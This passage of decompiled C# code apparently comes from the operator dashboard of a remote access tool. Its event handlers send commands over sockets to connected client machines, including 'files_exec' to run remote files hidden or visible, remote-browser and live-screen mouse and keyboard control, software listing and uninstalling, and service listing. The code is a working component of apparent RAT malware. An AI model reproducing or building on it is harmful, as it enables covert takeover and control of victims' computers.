				Class130.concurrentDictionary_3[this.string_4].fSrch.method_6();
			}
			Class130.concurrentDictionary_3[this.string_4].fSrch.method_0(this.string_8);
		}
	}

	// Token: 0x06000900 RID: 2304 RVA: 0x0004A930 File Offset: 0x00048B30
	private void method_162(object sender, EventArgs e)
	{
		string text = string.Empty;
		GClass7 gclass = this.vmethod_720();
		checked
		{
			int num = gclass.Items.Count - 1;
			int i = 0;
			while (i <= num)
			{
				if (!gclass.Items[i].Selected)
				{
					i++;
				}
				else
				{
					text = Conversions.ToString(gclass.Items[i].Tag);
					IL_55:
					if (Operators.CompareString(text, string.Empty, true) == 0)
					{
						Interaction.MsgBox("No file selected!", MsgBoxStyle.Exclamation, Application.ProductName);
						return;
					}
					string text2 = Interaction.InputBox("Enter command line parameters: (Leave empty for none)", Application.ProductName, string.Empty, -1, -1);
					ConcurrentDictionary<string, CClient> concurrentDictionary_;
					string key;
					CClient value = (concurrentDictionary_ = Class130.concurrentDictionary_3)[key = this.string_4];
					string text3 = string.Concat(new string[]
					{
						"files_exec|",
						text,
						"|",
						text2,
						"|1"
					});
					long num2 = 0L;
					ref string ptr = ref text3;
					ref CClient ptr2 = ref value;
					try
					{
						if (num2 > 0L)
						{
							Thread.Sleep((int)(num2 * 60000L));
						}
						ptr += "@";
						byte[] bytes = Encoding.UTF8.GetBytes(ptr);
						ptr2.sock_async.method_6(bytes);
						CClient cclient = ptr2;
						ref double ptr3 = ref cclient.stats_bytes_out;
						unchecked
						{
							cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
							ptr3 = ref Class130.struct20_0.double_3;
							Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
							ptr3 = ref Class130.struct20_0.double_5;
							Class130.struct20_0.double_5 = ptr3 + 1.0;
						}
					}
					catch (Exception ex)
					{
					}
					concurrentDictionary_[key] = value;
					return;
				}
			}
			goto IL_55;
		}
	}

	// Token: 0x06000901 RID: 2305 RVA: 0x0004AAEC File Offset: 0x00048CEC
	private void method_163(object sender, EventArgs e)
	{
		string text = string.Empty;
		GClass7 gclass = this.vmethod_720();
		checked
		{
			int num = gclass.Items.Count - 1;
			int i = 0;
			while (i <= num)
			{
				if (!gclass.Items[i].Selected)
				{
					i++;
				}
				else
				{
					text = Conversions.ToString(gclass.Items[i].Tag);
					IL_55:
					if (Operators.CompareString(text, string.Empty, true) == 0)
					{
						Interaction.MsgBox("No file selected!", MsgBoxStyle.Exclamation, Application.ProductName);
						return;
					}
					string text2 = Interaction.InputBox("Enter command line parameters: (Leave empty for none)", Application.ProductName, string.Empty, -1, -1);
					ConcurrentDictionary<string, CClient> concurrentDictionary_;
					string key;
					CClient value = (concurrentDictionary_ = Class130.concurrentDictionary_3)[key = this.string_4];
					string text3 = string.Concat(new string[]
					{
						"files_exec|",
						text,
						"|",
						text2,
						"|0"
					});
					long num2 = 0L;
					ref string ptr = ref text3;
					ref CClient ptr2 = ref value;
					try
					{
						if (num2 > 0L)
						{
							Thread.Sleep((int)(num2 * 60000L));
						}
						ptr += "@";
						byte[] bytes = Encoding.UTF8.GetBytes(ptr);
						ptr2.sock_async.method_6(bytes);
						CClient cclient = ptr2;
						ref double ptr3 = ref cclient.stats_bytes_out;
						unchecked
						{
							cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
							ptr3 = ref Class130.struct20_0.double_3;
							Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
							ptr3 = ref Class130.struct20_0.double_5;
							Class130.struct20_0.double_5 = ptr3 + 1.0;
						}
					}
					catch (Exception ex)
					{
					}
					concurrentDictionary_[key] = value;
					return;
				}
			}
			goto IL_55;
		}
	}

	// Token: 0x06000902 RID: 2306 RVA: 0x0004ACA8 File Offset: 0x00048EA8
	private void method_164(object sender, MouseEventArgs e)
	{
		if (Operators.CompareString(this.vmethod_708().Text, "Stop", true) == 0)
		{
			if (e.Button == MouseButtons.Left)
			{
				string text = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"remotebrowser_click|",
					Conversions.ToString(514),
					",",
					Conversions.ToString(this.vmethod_464().Bounds.Width),
					",",
					Conversions.ToString(this.vmethod_464().Bounds.Height),
					",",
					Conversions.ToString(e.X),
					",",
					Conversions.ToString(e.Y)
				});
				string text3 = text;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
			}
			if (e.Button == MouseButtons.Right)
			{
				string text4 = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"remotebrowser_click|",
					Conversions.ToString(517),
					",",
					Conversions.ToString(this.vmethod_464().Bounds.Width),
					",",
					Conversions.ToString(this.vmethod_464().Bounds.Height),
					",",
					Conversions.ToString(e.X),
					",",
					Conversions.ToString(e.Y)
				});
				string text3 = text4;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex2)
				{
				}
			}
			if (e.Button == MouseButtons.Middle)
			{
				string text5 = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"remotebrowser_click|",
					Conversions.ToString(520),
					",",
					Conversions.ToString(this.vmethod_464().Bounds.Width),
					",",
					Conversions.ToString(this.vmethod_464().Bounds.Height),
					",",
					Conversions.ToString(e.X),
					",",
					Conversions.ToString(e.Y)
				});
				string text3 = text5;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex3)
				{
				}
			}
		}
	}

	// Token: 0x06000903 RID: 2307 RVA: 0x0004B020 File Offset: 0x00049220
	private void method_165(object sender, MouseEventArgs e)
	{
		string text = this.string_4;
		string text2 = Conversions.ToString(Operators.ConcatenateObject("remotebrowser_scroll|", Interaction.IIf(e.Delta > 0, "1", "0")));
		string text3 = text;
		Class136.Class138 @class = new Class136.Class138();
		@class.string_0 = text3;
		@class.string_1 = text2;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000904 RID: 2308 RVA: 0x0004B0C8 File Offset: 0x000492C8
	private void fDashboard_KeyDown(object sender, KeyEventArgs e)
	{
		int selectedIndex = this.vmethod_18().SelectedIndex;
		if (selectedIndex != 1)
		{
			if (selectedIndex != 8)
			{
				if (selectedIndex != 11)
				{
					e.Handled = true;
				}
				else if (this.vmethod_464().Bounds.Contains(base.PointToClient(Cursor.Position)) & Operators.CompareString(this.vmethod_708().Text, "Stop", true) == 0)
				{
					if (e.KeyValue >= 33 & e.KeyValue <= 40)
					{
						string text = this.string_4;
						string text2 = "remotebrowser_key|" + Conversions.ToString((int)e.KeyCode);
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
						return;
					}
					int keyValue = e.KeyValue;
					if (keyValue == 8)
					{
						string text4 = this.string_4;
						string text2 = "remotebrowser_key|0|" + Conversions.ToString((int)e.KeyCode);
						string text3 = text4;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex2)
						{
						}
						return;
					}
				}
			}
		}
		else if (this.vmethod_94().Checked & (this.vmethod_24().Bounds.Contains(base.PointToClient(Cursor.Position)) | this.vmethod_248().Bounds.Contains(base.PointToClient(Cursor.Position))))
		{
			switch (e.KeyValue)
			{
			case 37:
			{
				string text5 = this.string_4;
				string text2 = "screenlive_key|" + Convert.ToBase64String(Encoding.UTF8.GetBytes("{LEFT}"));
				string text3 = text5;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex3)
				{
				}
				return;
			}
			case 38:
			{
				string text6 = this.string_4;
				string text2 = "screenlive_key|" + Convert.ToBase64String(Encoding.UTF8.GetBytes("{UP}"));
				string text3 = text6;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex4)
				{
				}
				return;
			}
			case 39:
			{
				string text7 = this.string_4;
				string text2 = "screenlive_key|" + Convert.ToBase64String(Encoding.UTF8.GetBytes("{RIGHT}"));
				string text3 = text7;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex5)
				{
				}
				return;
			}
			case 40:
			{
				string text8 = this.string_4;
				string text2 = "screenlive_key|" + Convert.ToBase64String(Encoding.UTF8.GetBytes("{DOWN}"));
				string text3 = text8;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex6)
				{
				}
				return;
			}
			default:
				return;
			}
		}
	}

	// Token: 0x06000905 RID: 2309 RVA: 0x000069FD File Offset: 0x00004BFD
	private void method_166(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Tab)
		{
			e.SuppressKeyPress = true;
		}
	}

	// Token: 0x06000906 RID: 2310 RVA: 0x00006A10 File Offset: 0x00004C10
	private void method_167(object sender, EventArgs e)
	{
		this.vmethod_24().Focus();
	}

	// Token: 0x06000907 RID: 2311 RVA: 0x00006A10 File Offset: 0x00004C10
	private void method_168(object sender, EventArgs e)
	{
		this.vmethod_24().Focus();
	}

	// Token: 0x06000908 RID: 2312 RVA: 0x000069FD File Offset: 0x00004BFD
	private void method_169(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Tab)
		{
			e.SuppressKeyPress = true;
		}
	}

	// Token: 0x06000909 RID: 2313 RVA: 0x000069FD File Offset: 0x00004BFD
	private void method_170(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Tab)
		{
			e.SuppressKeyPress = true;
		}
	}

	// Token: 0x0600090A RID: 2314 RVA: 0x00006A1E File Offset: 0x00004C1E
	private void method_171(object sender, EventArgs e)
	{
		this.vmethod_18().SelectedIndex = 12;
		this.method_41();
	}

	// Token: 0x0600090B RID: 2315 RVA: 0x0004B55C File Offset: 0x0004975C
	private void method_172(object sender, EventArgs e)
	{
		this.vmethod_550().Items.Clear();
		this.vmethod_550().Enabled = false;
		this.vmethod_512().BringToFront();
		this.vmethod_512().Visible = true;
		string text = this.string_4;
		string text2 = "soft_list|1";
		string text3 = text;
		Class136.Class138 @class = new Class136.Class138();
		@class.string_0 = text3;
		@class.string_1 = text2;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600090C RID: 2316 RVA: 0x0004B614 File Offset: 0x00049814
	private void method_173(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_550().Items.Count != 0)
			{
				string text = null;
				GClass7 gclass = this.vmethod_550();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						text += gclass.Items[i].Text;
						int num2 = gclass.Columns.Count - 1;
						for (int j = 1; j <= num2; j++)
						{
							text = text + "\t" + gclass.Items[i].SubItems[j].Text;
						}
						text += "\r\n";
					}
				}
				if (Operators.CompareString(text, null, true) != 0)
				{
					Clipboard.Clear();
					Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
				}
			}
		}
	}

	// Token: 0x0600090D RID: 2317 RVA: 0x0004B700 File Offset: 0x00049900
	private void method_174(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_550().Items.Count != 0)
			{
				string text = null;
				GClass7 gclass = this.vmethod_550();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					text += gclass.Items[i].Text;
					int num2 = gclass.Columns.Count - 1;
					for (int j = 1; j <= num2; j++)
					{
						text = text + "\t" + gclass.Items[i].SubItems[j].Text;
					}
					text += "\r\n";
				}
				if (Operators.CompareString(text, null, true) != 0)
				{
					Clipboard.Clear();
					Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
				}
			}
		}
	}

	// Token: 0x0600090E RID: 2318 RVA: 0x000069FD File Offset: 0x00004BFD
	private void method_175(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Tab)
		{
			e.SuppressKeyPress = true;
		}
	}

	// Token: 0x0600090F RID: 2319 RVA: 0x000069FD File Offset: 0x00004BFD
	private void method_176(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Tab)
		{
			e.SuppressKeyPress = true;
		}
	}

	// Token: 0x06000910 RID: 2320 RVA: 0x000069FD File Offset: 0x00004BFD
	private void method_177(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Tab)
		{
			e.SuppressKeyPress = true;
		}
	}

	// Token: 0x06000911 RID: 2321 RVA: 0x000069FD File Offset: 0x00004BFD
	private void method_178(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Tab)
		{
			e.SuppressKeyPress = true;
		}
	}

	// Token: 0x06000912 RID: 2322 RVA: 0x000069FD File Offset: 0x00004BFD
	private void method_179(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Tab)
		{
			e.SuppressKeyPress = true;
		}
	}

	// Token: 0x06000913 RID: 2323 RVA: 0x0004B7D8 File Offset: 0x000499D8
	private void method_180(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_550().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_550();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string str = "soft_uninstall|";
						ListViewItem listViewItem;
						object[] array;
						bool[] array2;
						object obj = NewLateBinding.LateGet(Encoding.UTF8, null, "GetBytes", array = new object[]
						{
							(listViewItem = gclass.Items[i]).Tag
						}, null, null, array2 = new bool[]
						{
							true
						});
						if (array2[0])
						{
							listViewItem.Tag = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
						}
						string text2 = str + Convert.ToBase64String((byte[])obj);
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x06000914 RID: 2324 RVA: 0x0004B924 File Offset: 0x00049B24
	private void method_181(object sender, MouseEventArgs e)
	{
		this.vmethod_530().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_550().Items.Count > 0, true, false));
		if (this.vmethod_550().Items.Count > 0)
		{
			this.vmethod_596().Enabled = Conversions.ToBoolean(Interaction.IIf(Strings.Len(RuntimeHelpers.GetObjectValue(this.vmethod_550().SelectedItems[0].Tag)) > 8, true, false));
		}
	}

	// Token: 0x06000915 RID: 2325 RVA: 0x0004B9BC File Offset: 0x00049BBC
	private void method_182(object sender, MouseEventArgs e)
	{
		if (this.vmethod_94().Checked)
		{
			if (e.Button == MouseButtons.Left)
			{
				string text = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"screenlive_click|",
					Conversions.ToString(2),
					",",
					Conversions.ToString(this.vmethod_248().Bounds.Width),
					",",
					Conversions.ToString(this.vmethod_248().Bounds.Height),
					",",
					Conversions.ToString(e.X),
					",",
					Conversions.ToString(e.Y),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_250().SelectedIndex).long_0),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_250().SelectedIndex).long_1),
					",",
					Conversions.ToString(this.vmethod_250().SelectedIndex)
				});
				string text3 = text;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
			}
			if (e.Button == MouseButtons.Right)
			{
				string text4 = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"screenlive_click|",
					Conversions.ToString(8),
					",",
					Conversions.ToString(this.vmethod_248().Bounds.Width),
					",",
					Conversions.ToString(this.vmethod_248().Bounds.Height),
					",",
					Conversions.ToString(e.X),
					",",
					Conversions.ToString(e.Y),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_250().SelectedIndex).long_0),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_250().SelectedIndex).long_1),
					",",
					Conversions.ToString(this.vmethod_250().SelectedIndex)
				});
				string text3 = text4;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex2)
				{
				}
			}
			if (e.Button == MouseButtons.Middle)
			{
				string text5 = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"screenlive_click|",
					Conversions.ToString(32),
					",",
					Conversions.ToString(this.vmethod_248().Bounds.Width),
					",",
					Conversions.ToString(this.vmethod_248().Bounds.Height),
					",",
					Conversions.ToString(e.X),
					",",
					Conversions.ToString(e.Y),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_250().SelectedIndex).long_0),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_250().SelectedIndex).long_1),
					",",
					Conversions.ToString(this.vmethod_250().SelectedIndex)
				});
				string text3 = text5;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex3)
				{
				}
			}
		}
	}

	// Token: 0x06000916 RID: 2326 RVA: 0x0004BE84 File Offset: 0x0004A084
	private void method_183(object sender, MouseEventArgs e)
	{
		if (this.vmethod_94().Checked)
		{
			if (e.Button == MouseButtons.Left)
			{
				string text = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"screenlive_click|",
					Conversions.ToString(4),
					",",
					Conversions.ToString(this.vmethod_248().Bounds.Width),
					",",
					Conversions.ToString(this.vmethod_248().Bounds.Height),
					",",
					Conversions.ToString(e.X),
					",",
					Conversions.ToString(e.Y),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_250().SelectedIndex).long_0),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_250().SelectedIndex).long_1),
					",",
					Conversions.ToString(this.vmethod_250().SelectedIndex)
				});
				string text3 = text;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
			}
			if (e.Button == MouseButtons.Right)
			{
				string text4 = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"screenlive_click|",
					Conversions.ToString(16),
					",",
					Conversions.ToString(this.vmethod_248().Bounds.Width),
					",",
					Conversions.ToString(this.vmethod_248().Bounds.Height),
					",",
					Conversions.ToString(e.X),
					",",
					Conversions.ToString(e.Y),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_250().SelectedIndex).long_0),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_250().SelectedIndex).long_1),
					",",
					Conversions.ToString(this.vmethod_250().SelectedIndex)
				});
				string text3 = text4;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex2)
				{
				}
			}
			if (e.Button == MouseButtons.Middle)
			{
				string text5 = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"screenlive_click|",
					Conversions.ToString(64),
					",",
					Conversions.ToString(this.vmethod_248().Bounds.Width),
					",",
					Conversions.ToString(this.vmethod_248().Bounds.Height),
					",",
					Conversions.ToString(e.X),
					",",
					Conversions.ToString(e.Y),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_250().SelectedIndex).long_0),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_250().SelectedIndex).long_1),
					",",
					Conversions.ToString(this.vmethod_250().SelectedIndex)
				});
				string text3 = text5;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex3)
				{
				}
			}
		}
	}

	// Token: 0x06000917 RID: 2327 RVA: 0x0004C34C File Offset: 0x0004A54C
	private void method_184(object sender, MouseEventArgs e)
	{
		if ((this.vmethod_292().Checked & Operators.CompareString(this.vmethod_686().Text, "Stop", true) == 0) && (e.X != this.int_1 | this.int_2 != e.Y))
		{
			Class136.Struct27 @struct = default(Class136.Struct27);
			@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
			bool flag = false;
			if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
			{
				flag = true;
			}
			long num;
			if (flag)
			{
				num = Class136.GetTickCount64();
			}
			else
			{
				num = (long)Class136.GetTickCount();
			}
			if ((double)num - Conversion.Val(RuntimeHelpers.GetObjectValue(this.vmethod_248().Tag)) >= 50.0)
			{
				string text = this.string_4;
				string text2 = string.Concat(new string[]
				{
					"screenlive_move|",
					Conversions.ToString(this.vmethod_248().Bounds.Width),
					",",
					Conversions.ToString(this.vmethod_248().Bounds.Height),
					",",
					Conversions.ToString(e.X),
					",",
					Conversions.ToString(e.Y),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_250().SelectedIndex).long_0),
					",",
					Conversions.ToString(this.concurrentStack_0.ElementAtOrDefault(this.vmethod_250().SelectedIndex).long_1),
					",",
					Conversions.ToString(this.vmethod_250().SelectedIndex)
				});
				string text3 = text;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
				PictureBox pictureBox = this.vmethod_248();
				@struct = default(Class136.Struct27);
				@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
				flag = false;
				if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
				{
					flag = true;
				}
				if (flag)
				{
					num = Class136.GetTickCount64();
				}
				else
				{
					num = (long)Class136.GetTickCount();
				}
				long num2 = num;
				pictureBox.Tag = num2;
			}
			this.int_1 = e.X;
			this.int_2 = e.Y;
		}
	}

	// Token: 0x06000918 RID: 2328 RVA: 0x00048090 File Offset: 0x00046290
	private void method_185(object sender, MouseEventArgs e)
	{
		if (this.vmethod_94().Checked)
		{
			string text = this.string_4;
			string text2 = "screenlive_scroll|" + Conversions.ToString(e.Delta);
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06000919 RID: 2329 RVA: 0x0004C604 File Offset: 0x0004A804
	private void method_186(object sender, ColumnClickEventArgs e)
	{
		SortOrder sortOrder_;
		if (this.vmethod_550().Sorting == SortOrder.Descending)
		{
			this.vmethod_550().Sorting = SortOrder.Ascending;
			sortOrder_ = SortOrder.Ascending;
		}
		else
		{
			this.vmethod_550().Sorting = SortOrder.Descending;
			sortOrder_ = SortOrder.Descending;
		}
		this.vmethod_550().ListViewItemSorter = new Class143(e.Column, sortOrder_);
	}

	// Token: 0x0600091A RID: 2330 RVA: 0x0004C654 File Offset: 0x0004A854
	private void method_187(object sender, ColumnClickEventArgs e)
	{
		SortOrder sortOrder_;
		if (this.vmethod_718().Sorting == SortOrder.Descending)
		{
			this.vmethod_718().Sorting = SortOrder.Ascending;
			sortOrder_ = SortOrder.Ascending;
		}
		else
		{
			this.vmethod_718().Sorting = SortOrder.Descending;
			sortOrder_ = SortOrder.Descending;
		}
		this.vmethod_718().ListViewItemSorter = new Class143(e.Column, sortOrder_);
	}

	// Token: 0x0600091B RID: 2331 RVA: 0x0004C6A4 File Offset: 0x0004A8A4
	public void method_188(int int_6)
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new fDashboard.Delegate31(this.method_188), new object[]
			{
				int_6
			});
			return;
		}
		base.Opacity = Conversion.Val((double)this.int_0 / 100.0);
	}

	// Token: 0x0600091C RID: 2332 RVA: 0x0004A0E8 File Offset: 0x000482E8
	private void method_189(object sender, EventArgs e)
	{
		this.vmethod_444().Text = "Selected: " + Conversions.ToString(this.vmethod_720().SelectedItems.Count);
		if (this.fThumb_0 != null && this.fThumb_0.Visible)
		{
			GClass7 gclass = this.vmethod_720();
			if (gclass.SelectedItems.Count > 0 && Class136.smethod_5(gclass.SelectedItems[0].Text))
			{
				this.fThumb_0.method_0(gclass.SelectedItems[0].Text, this.string_0, this.string_1, this.string_2, this.string_3);
				string text = this.string_4;
				string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("thumb_data|", gclass.SelectedItems[0].Tag), "|"), Class130.fSettings_0.vmethod_92().Text), "|"), Class130.fSettings_0.vmethod_86().Text));
				string text3 = text;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
				this.fThumb_0.method_1();
			}
		}
	}

	// Token: 0x0600091D RID: 2333 RVA: 0x00006A33 File Offset: 0x00004C33
	private void method_190(object sender, EventArgs e)
	{
		this.vmethod_18().SelectedIndex = 13;
		this.method_41();
	}

	// Token: 0x0600091E RID: 2334 RVA: 0x0004C700 File Offset: 0x0004A900
	private void method_191(object sender, EventArgs e)
	{
		this.vmethod_578().Enabled = false;
		this.vmethod_578().Items.Clear();
		this.vmethod_566().BringToFront();
		this.vmethod_566().Visible = true;
		string text = this.string_4;
		string text2 = "srv_list|1";
		string text3 = text;
		Class136.Class138 @class = new Class136.Class138();
		@class.string_0 = text3;
		@class.string_1 = text2;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600091F RID: 2335 RVA: 0x0004C7B8 File Offset: 0x0004A9B8
	private void method_192(object sender, DoWorkEventArgs e)
	{
		this.int_0 = 0;
		while (this.int_0 < 100)
		{
			ref int ptr = ref this.int_0;
			this.int_0 = checked(ptr + 5);
			this.method_188(this.int_0);
			Thread.Sleep(1);
		}
	}

	// Token: 0x06000920 RID: 2336 RVA: 0x0004C7F8 File Offset: 0x0004A9F8
	private void method_193(object sender, KeyEventArgs e)
	{
		if (e.KeyData == (Keys)131137)
		{
			try
			{
				foreach (object obj in this.vmethod_550().Items)
				{
